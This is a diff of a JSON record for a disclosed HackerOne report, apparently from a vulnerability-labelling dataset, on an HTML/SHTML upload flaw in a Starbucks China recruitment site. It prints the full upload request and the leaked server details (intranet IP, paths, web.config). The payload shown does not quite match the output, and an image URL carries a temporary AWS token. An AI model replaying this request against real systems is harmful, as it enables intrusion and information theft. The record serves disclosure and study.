@@ -1,50 +1,50 @@
 {
-    "reported_to": "Starbucks",
-    "reported_by": "b006e4ea768a5d1b5340969 ",
-    "title": "China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability",
-    "content": "\n### 1, Summary\nDuring the test, I found ecjobsdc.starbucks.com.cn this site has an upload vulnerability, you can upload html and shtml format files, so you can read the server's intranet IP, the physical address of the website application and read the website web.config file.\n###2, Vulnerability scope\nhttps://ecjobsdc.starbucks.com.cn\n###3, proof of exploit\nBy modifying the suffix of filename, this address can be uploaded to upload html and shtml files, so that you can read the server's intranet IP, the physical address of the website application, and the configuration file of the website.\nVulnerability certificate\nCode 668 Bytes\n1POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1\n2Host: ecjobsdc.starbucks.com.cn\n3Connection: close\n4Content-Length: 234\n5Cache-Control: max-age=0\n6Origin: null\n7Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06\n8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n9Accept-Encoding: gzip, deflate\n10Accept-Language: zh-CN,zh;q=0.9\n11\n12------WebKitFormBoundaryevPInYidBxSvSd06\n13Content-Disposition: form-data; name=\"hxwebfileboxcontrol_upload_file_inputbox\"; filename=\"xxx.shtml\"\n14Content-Type: text/html\n15\n16<?php echo 1111;>\n17------WebKitFormBoundaryevPInYidBxSvSd06--\nSuccessfully read the website's remoteaddr webpathinfo web.config file.\nCode 829 Bytes\n1DOCUMENT_NAME\u001aD:\\TrustHX\\STBKSERM101\\www_app\\tempfiles\\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\n2SERVER_SOFTWARE :Microsoft-IIS/8.5\n3SERVER_NAME :ecjobsdc.starbucks.com.cn\n4SERVER_PORT :80\n5REMOTE_ADDR:10.92.29.50\n6REMOTE_HOST:10.92.29.50\n7D:\\TrustHX\\STBKSERM101\\www_app\\tempfiles\\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\n8PATH_INFO:/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\n9text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n10/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\n11<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n12<configuration>\n13    <system.webServer>\n14        <httpRedirect enabled=\"false\" destination=\"https://ecjobs.starbucks.net\" exactDestination=\"false\" />\n15    </system.webServer>\n16</configuration>\n<image_0>\nImpact\nPhishing attack, remote file reading\n\n",
-    "severity": [
-        7.5,
-        null
+  "reported_to": "Starbucks",
+  "reported_by": "b006e4ea768a5d1b5340969 ",
+  "title": "China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability",
+  "content": "\n### 1, Summary\nDuring the test, I found ecjobsdc.starbucks.com.cn this site has an upload vulnerability, you can upload html and shtml format files, so you can read the server's intranet IP, the physical address of the website application and read the website web.config file.\n###2, Vulnerability scope\nhttps://ecjobsdc.starbucks.com.cn\n###3, proof of exploit\nBy modifying the suffix of filename, this address can be uploaded to upload html and shtml files, so that you can read the server's intranet IP, the physical address of the website application, and the configuration file of the website.\nVulnerability certificate\nCode 668 Bytes\n1POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1\n2Host: ecjobsdc.starbucks.com.cn\n3Connection: close\n4Content-Length: 234\n5Cache-Control: max-age=0\n6Origin: null\n7Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06\n8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n9Accept-Encoding: gzip, deflate\n10Accept-Language: zh-CN,zh;q=0.9\n11\n12------WebKitFormBoundaryevPInYidBxSvSd06\n13Content-Disposition: form-data; name=\"hxwebfileboxcontrol_upload_file_inputbox\"; filename=\"xxx.shtml\"\n14Content-Type: text/html\n15\n16<?php echo 1111;>\n17------WebKitFormBoundaryevPInYidBxSvSd06--\nSuccessfully read the website's remoteaddr webpathinfo web.config file.\nCode 829 Bytes\n1DOCUMENT_NAME\u001aD:\\TrustHX\\STBKSERM101\\www_app\\tempfiles\\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\n2SERVER_SOFTWARE :Microsoft-IIS/8.5\n3SERVER_NAME :ecjobsdc.starbucks.com.cn\n4SERVER_PORT :80\n5REMOTE_ADDR:10.92.29.50\n6REMOTE_HOST:10.92.29.50\n7D:\\TrustHX\\STBKSERM101\\www_app\\tempfiles\\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\n8PATH_INFO:/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\n9text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n10/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\n11<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n12<configuration>\n13    <system.webServer>\n14        <httpRedirect enabled=\"false\" destination=\"https://ecjobs.starbucks.net\" exactDestination=\"false\" />\n15    </system.webServer>\n16</configuration>\n<image_0>\nImpact\nPhishing attack, remote file reading\n\n",
+  "severity": [
+    7.5,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Privilege Escalation"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/349/302/a156bc1f7b8d767eb2b16950390444b2521e7dbc/ss2.PNG?response-content-disposition=attachment%3B%20filename%3D%22ss2.PNG%22%3B%20filename%2A%3DUTF-8%27%27ss2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWXARKABP%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T015031Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQClN7DZCqKULHdxPGReW%2BtGboDh0K4PtP%2BzWS67e5RzzQIgUjispeA%2FeivjjBxCkWbHQW1bKC4OUdWgn9LExPJqXakqsgUIHxADGgwwMTM2MTkyNzQ4NDkiDN%2FWlJK2Z9nKoTVE3iqPBYw3QraCA1DwB02p5RpsZkGDC0QHR7u%2BSx3C9kPb9JGNBV%2BhwKonMG1vmszS9ieQyC%2BNgp5T4v9EGX5cKm8KIOmxS%2FWcDOLVBdHBfdyRkYl90pSPBarJBh6Naza81Gjyf%2F0urZdH5t6U7Q3hZD2rwUcB9BET15JQnLoWC5Qxlz0NnMKrKJL4kORErqfOkPYJ9cBktHBS0LJrU0Kuw3yMT25uFMSv5mnGYcpEhWU8i9ZPMIcmBw58kitfv3QbHxzaaS3n2XL1JZ4Vj7jC1juL4HDWsxGzaYZZPk%2BHQdkHIcOML4OKAXZk0j78SGNgizXVoIvj6v1SIqfbpWw%2B4udAWVI3rfWyjDthUe%2FIvp8Bl20rR3j9PAwkfZadcT9BG5cciObR00CP9RZQNmn7ufFThAP3y3wdlIHUW%2FFfnIZZliVpWOj7gLYV3Uk9MAA%2B1d8B9hassF4zAQXwdn%2FPYVBe5Vh9vuuTz8HvChNvQ%2Bdd3G5XP24JCIrF%2FUQ3hx8AmbEQHr01q2NmpgMAMH0NulwTKZuOCnvoYfL34iGE4eIIf8L7fYJWZjmLhUwmbc6ZKEIB03KjSxU%2BlTqpdd2x4KKWVm4kSNPQjUi7rhC%2Fup326OsWC19BLfWQb1%2Bsgu979mPzXv1LhPx3vNuPVwbl5X14XfU72Oa2zZJX2GS0N%2BOo1ErTflrgkh4QW%2FQKSs7g54XY4J7slOcmHu52SBF3FBgX4nnoDzJRoH%2FqxsAofeorMKzVXK%2BnYPZHs2nT5QJpgWF0NHefHJSRX2DQTbS4%2Fm8AyoCtBJ3kcc8YLw1%2FmEmc20unzaYfDGLPjLHRhfLyB2wQqQqtk7AM%2FCDFY0yfbWNu7zaBblt45e12IzYh9jgJKAcwm9KMvwY6sQGGTJEauGXkbYbJ7PkVrb7e7xPBY%2BhFUQc2MIMPrK3SOcvaf7dN19FItI%2Bh%2FkaMpY90hQQ6zNHnHRrzrrBitz77o0M6XwC%2BwKzxU8ljEXvOdO4D9BXIei%2FhzHW82A8FOkR2FuQVRXQu4lvRYuM0ZTG7RqhLlJh9mbJJ1Cpy11FVKZ2SiS907tyotI74Lp9vOz0dfPIwvBCTThtqxjQas%2BitAzQKBwrVlM6b5BV%2FtR%2FWZ4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9ceb72f7be7b9c024abe9e7c236fa6c77d6bca3fbd7c0d9025017499f938e4bc"
+  },
+  "disclosed_date": 1580278620,
+  "report_url": "https://hackerone.com/reports/412481",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a POST request to https://ecjobsdc.starbucks.com.cn/recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file with a multipart form data containing an HTML or SHTML file."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Privilege Escalation"
-    ],
-    "screenshots": {
-        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/349/302/a156bc1f7b8d767eb2b16950390444b2521e7dbc/ss2.PNG?response-content-disposition=attachment%3B%20filename%3D%22ss2.PNG%22%3B%20filename%2A%3DUTF-8%27%27ss2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWXARKABP%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T015031Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQClN7DZCqKULHdxPGReW%2BtGboDh0K4PtP%2BzWS67e5RzzQIgUjispeA%2FeivjjBxCkWbHQW1bKC4OUdWgn9LExPJqXakqsgUIHxADGgwwMTM2MTkyNzQ4NDkiDN%2FWlJK2Z9nKoTVE3iqPBYw3QraCA1DwB02p5RpsZkGDC0QHR7u%2BSx3C9kPb9JGNBV%2BhwKonMG1vmszS9ieQyC%2BNgp5T4v9EGX5cKm8KIOmxS%2FWcDOLVBdHBfdyRkYl90pSPBarJBh6Naza81Gjyf%2F0urZdH5t6U7Q3hZD2rwUcB9BET15JQnLoWC5Qxlz0NnMKrKJL4kORErqfOkPYJ9cBktHBS0LJrU0Kuw3yMT25uFMSv5mnGYcpEhWU8i9ZPMIcmBw58kitfv3QbHxzaaS3n2XL1JZ4Vj7jC1juL4HDWsxGzaYZZPk%2BHQdkHIcOML4OKAXZk0j78SGNgizXVoIvj6v1SIqfbpWw%2B4udAWVI3rfWyjDthUe%2FIvp8Bl20rR3j9PAwkfZadcT9BG5cciObR00CP9RZQNmn7ufFThAP3y3wdlIHUW%2FFfnIZZliVpWOj7gLYV3Uk9MAA%2B1d8B9hassF4zAQXwdn%2FPYVBe5Vh9vuuTz8HvChNvQ%2Bdd3G5XP24JCIrF%2FUQ3hx8AmbEQHr01q2NmpgMAMH0NulwTKZuOCnvoYfL34iGE4eIIf8L7fYJWZjmLhUwmbc6ZKEIB03KjSxU%2BlTqpdd2x4KKWVm4kSNPQjUi7rhC%2Fup326OsWC19BLfWQb1%2Bsgu979mPzXv1LhPx3vNuPVwbl5X14XfU72Oa2zZJX2GS0N%2BOo1ErTflrgkh4QW%2FQKSs7g54XY4J7slOcmHu52SBF3FBgX4nnoDzJRoH%2FqxsAofeorMKzVXK%2BnYPZHs2nT5QJpgWF0NHefHJSRX2DQTbS4%2Fm8AyoCtBJ3kcc8YLw1%2FmEmc20unzaYfDGLPjLHRhfLyB2wQqQqtk7AM%2FCDFY0yfbWNu7zaBblt45e12IzYh9jgJKAcwm9KMvwY6sQGGTJEauGXkbYbJ7PkVrb7e7xPBY%2BhFUQc2MIMPrK3SOcvaf7dN19FItI%2Bh%2FkaMpY90hQQ6zNHnHRrzrrBitz77o0M6XwC%2BwKzxU8ljEXvOdO4D9BXIei%2FhzHW82A8FOkR2FuQVRXQu4lvRYuM0ZTG7RqhLlJh9mbJJ1Cpy11FVKZ2SiS907tyotI74Lp9vOz0dfPIwvBCTThtqxjQas%2BitAzQKBwrVlM6b5BV%2FtR%2FWZ4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9ceb72f7be7b9c024abe9e7c236fa6c77d6bca3fbd7c0d9025017499f938e4bc"
-    },
-    "disclosed_date": 1580278620,
-    "report_url": "https://hackerone.com/reports/412481",
-    "is_multi_component": true,
-    "complexity": "MEDIUM",
-    "novelty": "LOW",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Send a POST request to https://ecjobsdc.starbucks.com.cn/recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file with a multipart form data containing an HTML or SHTML file."
-        ],
-        [
-            2,
-            "Access the uploaded file to read server information such as intranet IP, physical address, and web.config file."
-        ]
-    ],
-    "vuln_description": "The vulnerability allows an attacker to upload HTML and SHTML files to the server, which can then be used to read sensitive server information including the intranet IP, physical address of the website application, and the web.config file. This can lead to phishing attacks and remote file reading.",
-    "reason": "The vulnerability involves a straightforward file upload mechanism without proper validation of file types. The attack does not require complex interactions or manipulation of application states, and the logic is commonly found in other applications.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": false,
-    "authnz_byppass_detectable": false,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": false,
-        "authnz_byppass_detectable": false
-    }
+    [
+      2,
+      "Access the uploaded file to read server information such as intranet IP, physical address, and web.config file."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an attacker to upload HTML and SHTML files to the server, which can then be used to read sensitive server information including the intranet IP, physical address of the website application, and the web.config file. This can lead to phishing attacks and remote file reading.",
+  "reason": "The vulnerability involves a straightforward file upload mechanism without proper validation of file types. The attack does not require complex interactions or manipulation of application states, and the logic is commonly found in other applications.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": false,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an upload functionality that allows unauthorized file types (html/shtml) to be uploaded, which can then be used to read sensitive server information. This falls under the category of AuthZ bypass as it allows unauthorized access to server resources. The methodology described involves testing for AuthZ bypass by swapping user sessions and testing access to resources, which could potentially detect this vulnerability if the upload functionality is tested with different user sessions or without authentication.",
+    "is_detectable": true
+  }
 }
